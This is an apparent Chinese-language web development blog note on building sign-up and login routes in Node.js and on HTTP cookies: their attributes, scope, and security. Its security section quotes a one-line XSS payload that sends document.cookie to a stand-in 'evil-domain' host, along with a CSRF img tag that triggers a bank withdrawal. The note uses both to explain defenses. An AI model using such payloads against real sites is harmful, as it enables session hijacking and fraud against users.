---
title: HTTP系列 -- 注册登录 + Cookie
date: 2018-02-07 19:13:20
tags: HTTP
---
# 概述
我们每天在使用电脑的时候都会去注册或者登录，作为前端是必须要了解其中的过程的。

# 注册
### 后端
后端需要一个路由，当用户请求注册界面时，后端要去读取注册界面，之后发给前端，并且还要设置 ` method `
-  ` GET ` ==> 请求注册页面
    ```
    else if( path === '/sign_up' && method === 'GET'){
        let string = fs.readFileSync( './sign_up.html', 'utf-8' )
        response.setHeader( 'Content-Type', 'text/html;charset=utf-8' )
        response.statusCode = 200
        response.write( string )
        response.end()
    }
    ```
- ` POST ` ==> 用户注册发送数据（使用表单 | AJAX）
    ```
    else if( path === '/sign_up' && method === 'POST' ){
        // 拿到前端 POST 的数据，之后进行处理，拿到后端想要的结构
        readBody( request ).then( () => {}, () => {} )
        // 后端进行验证
        // 1. 验证用户输入是否合格
        // 2. 验证用户名是否占用 | 邮箱是否占用（都是去和自己的数据库进行比较）
        // 3. 验证失败 ==> 以 JSON 格式传输给前端错误,400
        // 4. 验证成功 ==> 存储数据库，200
    }
    function readBody( request ){
        return new Promise( ( resolve, reject ) => {
            let body = []
            request.on( 'data', ( chunk ) => {
                body.push( chunk )
            }).on( 'end', () => {
                body = Buffer.concat( body ).toString()
                resolve( body )
            })
        })
    }
    ```
### 前端
##### 跳转注册界面
```
<a href='/sign_up.html'>
```
##### 提交用户输入数据
1. 拿到用户输入，可以监听 ` form ` 的 ` submit ` 事件
2. 前端验证
    - 验证成功 ==> 下一步
    - 验证失败 ==> 提示用户
3. 发送请求（数据是第四部分 formdata）
    - ` form ` 的 ` submit `
    - ` $post() `
4. 成功（打印 response） ==> 200 + 渲染页面
5. 失败（打印 response） ==> JSON 格式的字符串 + 解析 + 提示用户

# 登录
### 后端
后端需要一个路由，当用户请求登录界面时，后端要去读取登录界面，之后发给前端，并且还要设置 method
- ` GET ` ==> 请求注册页面
    ```
    else if( path === '/sign_in' && method === 'GET'){
        let string = fs.readFileSync( './sign_in.html', 'utf-8' )
        response.setHeader( 'Content-Type', 'text/html;charset=utf-8' )
        response.statusCode = 200
        response.write( string )
        response.end()
    }
    ```
- ` POST ` ==> 用户登录发送数据（使用表单 | AJAX）
    ```
    else if(path==='/sign_in' && method === 'POST'){
        // 拿到前端 POST 的数据，之后进行处理，拿到后端想要的结构
         readBody( request ).then( () => {}, () => {} )
        // 后端进行数据库比对
        // 1. 比对用户是否存在
        // 2. 比对用户输入密码是否正确
        // 3. 比对失败 ==> 以 JSON 格式传输给前端错误,400
        // 4. 比对成功 ==> 设置 Cookie ，200
        response.setHeader( 'Set-Cookie',  'xxx' ) // xxx 就是一个身份证
    ```
### 前端
##### 跳转登录界面
```
<a href='/sign_in.html'>
```
##### 提交用户输入数据
1. 拿到用户输入，可以监听 ` form ` 的 ` submit ` 事件
2. 前端验证
    - 验证成功 ==> 下一步
    - 验证失败 ==> 提示用户
3. 发送请求（数据是第四部分 formdata）
    - ` form ` 的 ` submit `
    - ` $post() `
4. 成功（打印 response） ==> 200 + 渲染页面
5. 失败（打印 response） ==> JSON 格式的字符串 + 解析 + 提示用户

# Cookie
服务器发送到用户浏览器并保存在用户本地的一小块数据，它会在浏览器下次向同一服务器再次发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。**Cookie使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能**

### 用途
Cookie 主要用于以下三个方面
1. 会话状态管理（如用户登录状态、购物车、游戏分数或其他需要记录的信息）
2. 个性化设置（如用户自定义设置、主题等）
3. 浏览器跟踪行为（如跟踪用户行为等）

### 后端 + code
后端验证成功（200）时会设置一个 Cookie 响应头
```
response.setHeader('Set-Cookie', 'xxx' ) // xxx 就是一个身份证
```
设置 Cookie 之后的同源请求都会带着 Cookie

##### 会话期 Cookie
浏览器关闭后会自动删除，它仅在会话期有效。会话期 Cookie 不需要指定过期时间（Expirse）或者有效期（Max-Age）

##### 持久性 Cookie
持久性 Cookie 可以指定一个特定的过期时间（Expirse）或有效期（Max-Age）
```
response.setHeader( 'Set-Cookie', 'id = xxx; Expirse = 时间点（Max-Age = 时长）' )
```

##### secure 标记
安全的 Cookie 只应通过 HTTPS 协议加密过的请求发送给服务端，设置 secure 标记的 Cookie 只在 HTTPS 中生效

##### HttpOnly 标记
由于 Cookie 可以通过 JS 的 ` document.cookie ` 进行修改，但是通过 JS 的 ` document.cookie ` 无法访问带有 HttpOnly 标记的 Cookie，所以包含服务端 Session 信息的 Cookie 不想被浏览器的 JS 脚本调用，设置 HttpOnly 标记即可
```
response.setHeader( 'Set-Cookie', 'id = a3fWa; Expires = GMT时间格式; Secure; HttpOnly' )
```
##### Cookie 作用域
` Domain ` + ` Path ` 标识定义了 Cookie 的作用域，即 Cookie 应该发送给那些 URL
- ` Domain ` ==> 制定哪些主机可以接收 Cookie，如果不指定，不包含子域名，如果指定了 ` Domain ` 则一般包含子域名。例如，如果设置 ` Domain = mozilla.org `，则 Cookie 也包含在子域名中（如 ` developer.mozilla.org `）

- ` Path ` ==> 制定了主机下哪些路径可以接收 Cookie（该 URL 路径必须存在于请求 URL 中）。例如，设置 ` Path = /docs `，那么以下路径都会匹配 ` /docs ` | ` /docs/web ` | ` /docs/web/http `

##### SameSite Cookie
SameSite Cookie 允许服务器指定在跨站请求时该 Cookie 是否会被发送，从而可以阻止跨站请求伪造攻击（CSRF）

### 安全
##### 会话挟持和 XSS
在 web 应用中，Cookie 常用来标记用户或授权会话，因此如果 web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 XSS 攻击
```
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```
` HttpOnly ` 类型的 Cookie 由于阻止了 JS 对 Cookie 的操作而能在一定程度上缓解此类攻击

##### CSRF（跨域请求伪造）
如果在不安全的聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求
```
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```
当打开含有这张图片的 HTML 页面时，如果之前登录了银行账号并且 Cookie 仍然有效（还没有其他验证步骤），银行中的钱会被自动转走。
###### 阻止 CSRF
1. 对用户输入进行过滤来阻止 XSS
2. 任何敏感操作都需要确认
3. 用于敏感信息的 Cookie 只能拥有较短的生命周期


### Cookie 特点
1. Cookie 储存用户信息
2. 服务器通过 ` Set-Cookie ` 响应头设置 Cookie 
3. 浏览器得到 Cookie 后，每次请求相同域名都要带上 Cookie 
4. 服务器通过 Cookie 得知是哪个用户（` request.headers.cookie ` // 读取 Cookie ）
5. Cookie 存储在本地的一个文件中
6. Cookie 不安全，用户可以通过开发者工具 Application/Cookie 可以进行修改，或者 JS 的 ` document.cookie ` 进行修改
7. 每个浏览器的 Cookie 不同
8. Cookie 有时效性
9. 后端可以强制设置 Cookie 有效期
10. Cookie 按域名划分。一个网站只会带着自己域名的 Cookie ，不会带着其他域的 Cookie 

##### Cookie 说明
Cookie 大小受限，每次请求新的页面 Cookie 都会被发送过去。Cookie 不能跨域调用。Cookie 的作用是与服务器进行交互，Cookie 作为 HTTP 规范的一部分存在 

##### 删除 Cookie
- 服务器端可以通过设置 Expires、max-age 两个标签将 Cookie 设置为过期状态
- JavaScript 可以通过document.cookie API 删除 Cookie


# 相关知识点
1. ` formdata ` 是一段一段上传的，上传时会触发 ` data ` 事件（node http get post data）

2. 前端是不安全的，所以前端可以不进行验证，但是后端必须进行验证。用户可以通过 ` curl ` 发送请求，这样就越过了前端 JS

3. ` decodeURIComponent() `
用于解码由 ` encodeURIComponent() ` 方法或其他类似方法编码的部分 URI（统一资源标识符）

4. [` Set-Cookie `](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie)

5. CSRF（跨域请求伪造） 是指一种挟持受信任用户向服务器发送非预期请求的攻击方式。例如，这些非预期请求可能在 URL 后加入一些恶意的参数，从而达到攻击者的目的

6. XSS（Cross-site scripting）是一种安全漏洞，攻击者利用这种漏洞在网上注入恶意的客户端代码。当被攻击者登录网站时就会自动运行这些恶意代码，从而攻击者可以突破网站的访问权限，冒充受害者。
    - 如果 Web 应用程序没有部署足够的安全验证，那么这些脚本可以任意读取 Cookie或者其他敏感的网站信息，或者让恶意脚本重写 HTML 内容
    - 以下两种情况最容易发生 XSS 攻击
        1. 数据从一个不可靠的链接进入一个 Web 应用程序
        2. 没有过滤掉恶意代码的动态内容被发送给 Web 用户
    - XSS 攻击类型
        1. **存储型（持久型）**：注入型脚本永久存储在目标服务器上，当浏览器请求数据时，脚本从服务器上传回并执行
        2. **反射型（非持久型）**：当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站，Web 服务器将注入脚本，比如一个错误信息、搜索结果等返回到用户浏览器上，浏览器会执行这个脚本，因为，浏览器认为这个响应来自可信任的服务器
        3. 基于 DOM 的 XSS：被执行的恶意脚本会修改页面脚本结构